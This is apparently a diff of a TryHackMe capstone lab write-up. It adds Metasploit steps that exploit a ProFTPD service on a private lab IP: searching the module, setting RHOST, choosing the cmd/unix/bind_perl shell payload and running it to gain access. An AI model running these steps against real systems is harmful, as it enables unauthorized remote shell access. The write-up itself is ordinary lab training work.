@@ -98,225 +98,36 @@ New IP of 10.10.144.237
 
 Whelp thats not working time to try another path
 
+... I lied after some research we may need to pick a payload
+	
+```msfconsole```
 
+```search proftp```
+	
+```use 6```
+	
+```set RHOST 10.10.144.237```
 
+```Show Options```
+	
 
+<img src="/images/TryHackMe/MiroLabsCapstone/Options.png">
 
+```Run```
 
+<img src="/images/TryHackMe/MiroLabsCapstone/RunFail.png">
 
+Now I see we need to select a payload
+	
+```Show Payloads```
 
+<img src="/images/TryHackMe/MiroLabsCapstone/RunFail.png">
 
+```set payload cmd/unix/bind_perl```
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+ANNNNDDDD We are in!
+	
+<img src="/images/TryHackMe/MiroLabsCapstone/Owned.png">
 
 
 <br/><br/>
